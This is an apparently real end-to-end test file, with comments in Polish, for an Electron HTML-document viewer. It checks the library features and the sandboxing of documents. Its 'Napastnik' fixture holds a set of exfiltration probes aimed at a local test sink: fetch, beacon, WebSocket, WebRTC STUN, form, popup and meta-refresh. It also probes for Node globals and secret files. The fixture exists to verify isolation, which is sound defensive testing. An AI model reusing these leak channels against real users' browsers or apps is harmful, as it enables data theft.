// Test końcowy na prawdziwym Electronie: izolacja dokumentu oraz działanie JS.
import assert from 'node:assert/strict'
import { createSocket } from 'node:dgram'
import { existsSync } from 'node:fs'
import { copyFile, mkdir, mkdtemp, readdir, readFile, rm, writeFile } from 'node:fs/promises'
import { createServer } from 'node:http'
import { networkInterfaces, tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { _electron as electron } from 'playwright-core'

const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..')
const artifacts = join(projectRoot, 'tests/e2e/artifacts')
const silosDoc = 'C:/Users/bakie/projects/silos/Silos-pivot-lamiglowki-v2.html'

const results = []
async function check(name, run) {
  try {
    await run()
    results.push(['OK', name])
  } catch (error) {
    results.push(['BŁĄD', `${name}: ${error.message.split('\n')[0]}`])
  }
}

const delay = (ms) => new Promise((done) => setTimeout(done, ms))

async function startLeakSink() {
  const hits = []
  const server = createServer((request, response) => {
    hits.push(`http ${request.method} ${request.url}`)
    response.setHeader('Access-Control-Allow-Origin', '*')
    response.end('ok')
  })
  server.on('upgrade', (request, socket) => {
    hits.push(`ws ${request.url}`)
    socket.destroy()
  })
  await new Promise((done) => server.listen(0, '127.0.0.1', done))

  const udp = createSocket('udp4')
  udp.on('message', () => hits.push('udp stun'))
  await new Promise((done) => udp.bind(0, '0.0.0.0', done))

  return {
    hits,
    httpPort: server.address().port,
    udpPort: udp.address().port,
    stop() {
      server.closeAllConnections()
      server.close()
      udp.close()
    }
  }
}

// Chromium nie wysyła STUN na adres pętli zwrotnej, więc próba WebRTC idzie przez adres LAN.
const lanAddress = () =>
  Object.values(networkInterfaces())
    .flat()
    .find((address) => address.family === 'IPv4' && !address.internal)?.address

const leakDoc = (httpPort, udpPort) => `<!doctype html><title>Napastnik</title>
<body><p id="status">start</p><a id="link" href="https://example.com/klik">link</a>
<form id="form" action="http://127.0.0.1:${httpPort}/form" method="post" target="ramka"><input name="a" value="1"></form>
<iframe name="ramka" src="http://127.0.0.1:${httpPort}/iframe"></iframe>
<link rel="stylesheet" href="http://127.0.0.1:${httpPort}/css">
<script src="http://127.0.0.1:${httpPort}/script.js"></script>
<script>
const base = 'http://127.0.0.1:${httpPort}'
window.probes = {}
const note = (name, run) => { try { run() } catch (error) { window.probes[name] = String(error) } }
fetch(base + '/fetch').catch(() => {})
fetch(base + '/no-cors', { mode: 'no-cors' }).catch(() => {})
new Image().src = base + '/img'
note('beacon', () => navigator.sendBeacon(base + '/beacon', 'dane'))
note('ws', () => new WebSocket('ws://127.0.0.1:${httpPort}/ws'))
note('rtc', () => {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${lanAddress()}:${udpPort}' }] })
  pc.createDataChannel('x')
  pc.createOffer().then((offer) => pc.setLocalDescription(offer))
})
setTimeout(() => document.getElementById('form').submit(), 800)
window.open(base + '/popup')
setTimeout(() => { location.href = base + '/navigate' }, 2400)
setTimeout(() => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + base + '/meta'; document.head.append(m) }, 1800)
fetch('htmldoc://dinnydokument/').then(() => { window.probes.crossDoc = 'odczytano' }).catch(() => { window.probes.crossDoc = 'zablokowano' })
window.probes.globals = [typeof require, typeof process, typeof window.api, typeof ipcRenderer].join(',')
document.getElementById('status').textContent = 'gotowe'
</script></body>`

const interactiveDoc = `<!doctype html><title>Interaktywny</title>
<body><h1 id="top">Quiz</h1><img id="obraz" src="pixel.svg" alt="">
<button id="plus">Dodaj</button><output id="wynik"></output>
<a id="kotwica" href="#dol">w dół</a><div style="height:3000px"></div><h2 id="dol">Dół</h2>
<script>
const key = 'licznik'
const show = () => { document.getElementById('wynik').textContent = localStorage.getItem(key) ?? '0' }
document.getElementById('plus').addEventListener('click', () => {
  localStorage.setItem(key, String(Number(localStorage.getItem(key) ?? 0) + 1)); show()
})
show()
</script></body>`

function attachDocument(app) {
  return async (fragment) => {
    const deadline = Date.now() + 10000
    while (Date.now() < deadline) {
      for (const page of app.windows()) {
        if (page.url().startsWith('htmldoc://') && (await page.title().catch(() => '')).includes(fragment)) {
          return page
        }
      }
      await delay(100)
    }
    throw new Error(`Nie znaleziono dokumentu „${fragment}”`)
  }
}

const DOCUMENT_BODY = `<style>body { margin: 16px }</style><h1>Temat</h1><h2>Cel</h2><h2>Ryzyka</h2>
<p>${'Akapit opisujący łamigłówki i decyzje projektowe. '.repeat(30)}</p>`

/** Dopisuje treść, dzięki której plik testowy zostanie rozpoznany jako dokument. */
const asDocument = (html) => html.replace('<body>', `<body>${DOCUMENT_BODY}`)

const documentNamed = (title, marker = '') =>
  `<!doctype html><title>${title}</title><body>${DOCUMENT_BODY}<p id="marker">${marker}</p></body>`

async function libraryFlow(workspace) {
  const home = join(workspace, 'flow-home')
  const docs = join(workspace, 'flow-docs')
  const profile = join(workspace, 'flow-profile')
  await mkdir(home, { recursive: true })
  await mkdir(docs, { recursive: true })
  await writeFile(join(home, 'config.json'), JSON.stringify({ roots: [docs] }))
  await writeFile(join(docs, 'stary.html'), documentNamed('Stary dokument'))

  const launch = () =>
    electron.launch({
      args: [projectRoot, `--user-data-dir=${profile}`],
      env: { ...process.env, HTMLDOCS_HOME: home }
    })

  let app = await launch()
  try {
    const shell = await app.firstWindow()
    const findDocument = attachDocument(app)
    const row = (name) => shell.locator('.row.doc', { hasText: name })
    await row('stary').waitFor()

    await check('nowy plik pojawia się bez ręcznego skanowania', async () => {
      await writeFile(join(docs, 'nowy.html'), documentNamed('Nowy dokument', 'pierwsza'))
      await row('nowy').waitFor({ timeout: 8000 })
    })

    await check('otwarcie oznacza dokument jako przeczytany', async () => {
      await row('nowy').click()
      await findDocument('Nowy dokument')
      await shell.getByLabel('Status dokumentu').waitFor()
      await shell.waitForFunction(
        () => document.querySelector('select[aria-label="Status dokumentu"]')?.value === 'read'
      )
    })

    await check('zmiana otwartego pliku proponuje nową wersję', async () => {
      await writeFile(join(docs, 'nowy.html'), documentNamed('Nowy dokument', 'druga'))
      const button = shell.getByRole('button', { name: 'Pokaż nową wersję' })
      await button.waitFor({ timeout: 8000 })
      await button.click()
      const page = await findDocument('Nowy dokument')
      await page.waitForFunction(() => document.getElementById('marker')?.textContent === 'druga')
    })

    await check('zmieniony dokument wraca do przeczytania i do skrzynki', async () => {
      await shell.getByRole('tab', { name: /Skrzynka/ }).click()
      await shell.locator('.two-line', { hasText: 'Nowy dokument' }).waitFor()
      await shell.getByRole('tab', { name: 'Biblioteka' }).click()
    })

    await check('wyszukiwanie znajduje treść bez polskich znaków', async () => {
      await shell.getByLabel('Szukaj w treści dokumentów').fill('lamiglowki')
      await shell.locator('.snippet mark').first().waitFor()
      assert.equal(await shell.locator('.snippet mark').first().textContent(), 'łamigłówki')
      await shell.getByLabel('Szukaj w treści dokumentów').fill('')
    })

    await check('status można zmienić ręcznie', async () => {
      await shell.getByLabel('Status dokumentu').selectOption('to-decide')
      await shell.locator('.row.doc .mark.decide').waitFor()
    })

    await check('niepewny plik można dodać do biblioteki', async () => {
      const prose = 'Długi tekst bez nagłówków, który nie wygląda na pełny dokument. '.repeat(20)
      await writeFile(join(docs, 'prawie.html'), `<title>Prawie</title><style>p{}</style><p>${prose}</p>`)
      const tab = shell.getByRole('tab', { name: /Niepewne/ })
      await shell.getByRole('tab', { name: /Niepewne 1/ }).waitFor({ timeout: 8000 })
      await tab.click()
      await shell.locator('.two-line', { hasText: 'Prawie' }).click()
      await shell.getByRole('button', { name: 'Dodaj do biblioteki' }).click()
      await shell.getByRole('tab', { name: 'Biblioteka' }).click()
      await row('prawie').waitFor()
    })

    await check('po usunięciu oryginału zostaje zachowana kopia', async () => {
      await rm(join(docs, 'stary.html'))
      await shell.locator('.row.doc', { hasText: 'stary' }).locator('.tag').waitFor({ timeout: 8000 })
      await row('stary').click()
      await findDocument('Stary dokument')
      await shell.locator('.notice', { hasText: 'zachowana kopia' }).waitFor()
    })
  } finally {
    await app.close()
  }

  app = await launch()
  try {
    const shell = await app.firstWindow()
    await check('status i kopia przetrwają ponowne uruchomienie', async () => {
      await shell.locator('.row.doc .mark.decide').waitFor()
      await shell.locator('.row.doc', { hasText: 'stary' }).locator('.tag').waitFor()
    })
    await shell.locator('.row.doc', { hasText: 'nowy' }).click()
    await delay(500)
    await shell.screenshot({ path: join(artifacts, 'library.png') })
  } finally {
    await app.close()
  }

  const metaFolders = await readdir(join(home, 'library'))
  await check('dane dokumentów są zwykłymi plikami w folderze użytkownika', async () => {
    assert.ok(metaFolders.length >= 3, metaFolders.join())
    const meta = JSON.parse(await readFile(join(home, 'library', metaFolders[0], 'meta.json'), 'utf8'))
    assert.ok(meta.versions.length >= 1)
    assert.equal(await readFile(join(home, '.gitignore'), 'utf8'), 'cache/\n')
  })
}

async function firstRun(workspace, docs) {
  const home = join(workspace, 'first-run')
  const app = await electron.launch({
    args: [projectRoot, `--user-data-dir=${join(workspace, 'first-run-profile')}`],
    env: { ...process.env, HTMLDOCS_HOME: home }
  })
  try {
    const shell = await app.firstWindow()
    await check('pierwszy start pokazuje wybór folderów', async () => {
      await shell.getByRole('button', { name: 'Dodaj foldery' }).waitFor()
    })
    await app.evaluate(({ dialog }, folder) => {
      dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [folder] })
    }, docs)
    await check('dodany folder trafia do drzewa i konfiguracji', async () => {
      await shell.getByRole('button', { name: 'Dodaj foldery' }).click()
      await shell.locator('.row.doc', { hasText: 'interaktywny' }).waitFor()
      const saved = JSON.parse(await readFile(join(home, 'config.json'), 'utf8'))
      assert.deepEqual(saved.roots, [docs])
    })
    await check('usunięcie folderu czyści drzewo', async () => {
      await shell.getByRole('button', { name: 'Usuń' }).click()
      await shell.locator('.row.doc').first().waitFor({ state: 'detached' })
    })
  } finally {
    await app.close()
  }
}

async function main() {
  const sink = await startLeakSink()
  const workspace = await mkdtemp(join(tmpdir(), 'htmldocs-e2e-'))
  const home = join(workspace, 'home')
  const docs = join(workspace, 'docs')
  await mkdir(home, { recursive: true })
  await mkdir(artifacts, { recursive: true })
  await mkdir(join(docs, 'node_modules', 'pkg'), { recursive: true })
  await writeFile(join(docs, 'node_modules', 'pkg', 'pomijany.html'), '<title>Pomijany</title>')
  await writeFile(join(docs, 'napastnik.html'), asDocument(leakDoc(sink.httpPort, sink.udpPort)))
  await writeFile(join(docs, 'interaktywny.html'), asDocument(interactiveDoc))
  await writeFile(join(docs, 'pixel.svg'), '<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"/>')
  await writeFile(join(docs, 'sekret.txt'), 'tajne')
  await writeFile(
    join(docs, 'link.html'),
    asDocument('<!doctype html><title>Link</title><body><a id="link" href="https://example.com/klik">link</a></body>')
  )
  const control = join(workspace, 'kontrola.html')
  await writeFile(control, leakDoc(sink.httpPort, sink.udpPort))

  const hasSilos = existsSync(silosDoc)
  if (hasSilos) await copyFile(silosDoc, join(docs, 'silos-v2.html'))

  await firstRun(workspace, docs)
  await libraryFlow(workspace)
  await writeFile(join(home, 'config.json'), JSON.stringify({ roots: [docs] }))

  const app = await electron.launch({
    args: [projectRoot, `--user-data-dir=${join(workspace, 'profile')}`],
    env: { ...process.env, HTMLDOCS_HOME: home }
  })
  const consoleErrors = []
  const shell = await app.firstWindow()
  shell.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text())
  })
  shell.on('pageerror', (error) => consoleErrors.push(String(error)))
  const findDocument = attachDocument(app)
  const openDoc = (name) => shell.locator('.row.doc', { hasText: name }).click()

  try {
    await shell.waitForSelector('.row.doc')

    await check('skan pomija node_modules i pokazuje dokumenty', async () => {
      const names = await shell.locator('.row.doc .label').allTextContents()
      assert.ok(names.includes('Napastnik'), names.join())
      assert.ok(!names.includes('Pomijany'), names.join())
    })

    await check('kontrola: bez ochrony te same próby docierają do serwera', async () => {
      const url = pathToFileURL(control).href
      await app.evaluate(({ BrowserWindow }, target) => {
        globalThis.controlWindow = new BrowserWindow({ show: false })
        void globalThis.controlWindow.loadURL(target).catch(() => {})
      }, url)
      await delay(3500)
      await app.evaluate(() => globalThis.controlWindow.destroy())
      await delay(300)
      const channels = new Set(sink.hits.map((hit) => hit.split(' ').slice(-1)[0]))
      sink.hits.length = 0
      console.log('Kontrola:', [...channels].join(' '))
      for (const channel of ['/fetch', '/img', '/ws', 'stun', '/iframe', '/beacon', '/form', '/popup', '/meta']) {
        assert.ok(channels.has(channel), `brak kanału ${channel}`)
      }
    })

    await app.evaluate(({ shell: electronShell }) => {
      globalThis.opened = []
      electronShell.openExternal = async (url) => void globalThis.opened.push(url)
    })
    const opened = () => app.evaluate(() => globalThis.opened)

    await openDoc('napastnik')
    const attacker = await findDocument('Napastnik')
    await attacker.waitForFunction(() => document.getElementById('status')?.textContent === 'gotowe')
    await delay(4000)

    await check('żaden kanał nie dotarł do serwera nasłuchującego', async () => {
      assert.deepEqual(sink.hits, [])
    })
    await check('dokument nie opuścił swojego adresu', async () => {
      assert.ok(attacker.url().startsWith('htmldoc://'), attacker.url())
    })
    await check('dokument nie ma dostępu do Node ani API apki', async () => {
      const probes = await attacker.evaluate(() => window.probes)
      assert.equal(probes.globals, 'undefined,undefined,undefined,undefined')
      assert.equal(probes.crossDoc, 'zablokowano')
    })
    await check('apka pokazuje liczbę zablokowanych żądań', async () => {
      const notice = await shell.locator('.notice').textContent()
      assert.match(notice, /Zablokowano \d+/)
    })
    await check('dokument nie czyta sąsiednich plików spoza listy', async () => {
      const status = await attacker.evaluate(() => fetch('sekret.txt').then((r) => r.status))
      assert.equal(status, 404)
    })
    await check('skrypt nie otwiera linku zewnętrznego bez kliknięcia', async () => {
      await attacker.evaluate(() => {
        document.getElementById('link').click()
        location.href = 'https://example.com/skrypt'
      })
      await delay(400)
      assert.deepEqual(await opened(), [])
    })
    await check('prawdziwe kliknięcie otwiera link w przeglądarce', async () => {
      await openDoc('link')
      const page = await findDocument('Link')
      await page.click('#link')
      await delay(300)
      assert.deepEqual(await opened(), ['https://example.com/klik'])
      assert.ok(page.url().startsWith('htmldoc://'))
    })

    await openDoc('interaktywny')
    let interactive = await findDocument('Interaktywny')
    await check('JS działa, a localStorage przetrwa ponowne otwarcie', async () => {
      await interactive.waitForSelector('#plus')
      const before = Number(await interactive.locator('#wynik').textContent())
      await interactive.click('#plus')
      await interactive.click('#plus')
      await openDoc('napastnik')
      await delay(300)
      await openDoc('interaktywny')
      interactive = await findDocument('Interaktywny')
      await interactive.waitForSelector('#plus')
      assert.equal(await interactive.locator('#wynik').textContent(), String(before + 2))
    })
    await check('obraz obok dokumentu się ładuje', async () => {
      await interactive.waitForFunction(() => document.getElementById('obraz').naturalWidth === 4)
    })
    await check('kotwica przewija dokument bez blokady', async () => {
      await interactive.click('#kotwica')
      await interactive.waitForFunction(() => window.scrollY > 500)
      assert.ok(interactive.url().endsWith('#dol'), interactive.url())
    })

    await check('widok dokumentu dopasowuje się do okna', async () => {
      const size = await interactive.evaluate(() => [innerWidth, innerHeight])
      const box = await shell.locator('.viewport').boundingBox()
      assert.deepEqual(size, [Math.round(box.width), Math.round(box.height)])
    })

    if (hasSilos) {
      await openDoc('Silos')
      const silos = await findDocument('Silos')
      await check('Silos: treść i generator działają', async () => {
        await silos.waitForLoadState('load')
        const sections = await silos.locator('section').count()
        assert.equal(sections, 20)
        const output = silos.locator('#gen-out')
        const button = silos.locator('#generator button').first()
        await button.scrollIntoViewIfNeeded()
        await button.click()
        const first = await output.innerText()
        await button.click()
        assert.ok(first.length > 50, 'generator nic nie wypisał')
        assert.notEqual(await output.innerText(), first)
      })
      await check('Silos: fonty są dozwolone, a dokument nie ma błędów', async () => {
        assert.equal(await shell.locator('.notice').count(), 0)
        await silos.evaluate(() => document.fonts.ready)
        const loaded = await silos.evaluate(() =>
          [...document.fonts].filter((font) => font.status === 'loaded').map((font) => font.family)
        )
        console.log('Fonty:', [...new Set(loaded)].join(', '))
        assert.ok(loaded.length > 0, 'żaden font nie został załadowany')
      })
      await silos.locator('#werdykt').scrollIntoViewIfNeeded()
      await silos.screenshot({ path: join(artifacts, 'silos-doc.png') })
    }

    await shell.screenshot({ path: join(artifacts, 'shell.png') })

    await check('powłoka nie zgłasza błędów w konsoli', async () => {
      assert.deepEqual(consoleErrors, [])
    })
  } finally {
    await app.close()
    sink.stop()
    await rm(workspace, { recursive: true, force: true }).catch(() => {})
  }

  for (const [status, name] of results) console.log(`${status.padEnd(5)} ${name}`)
  if (!hasSilos) console.log('POMINIĘTO dokument Silos')
  if (sink.hits.length) console.log('Trafienia:', sink.hits)
  process.exitCode = results.some(([status]) => status !== 'OK') ? 1 : 0
}

await main()
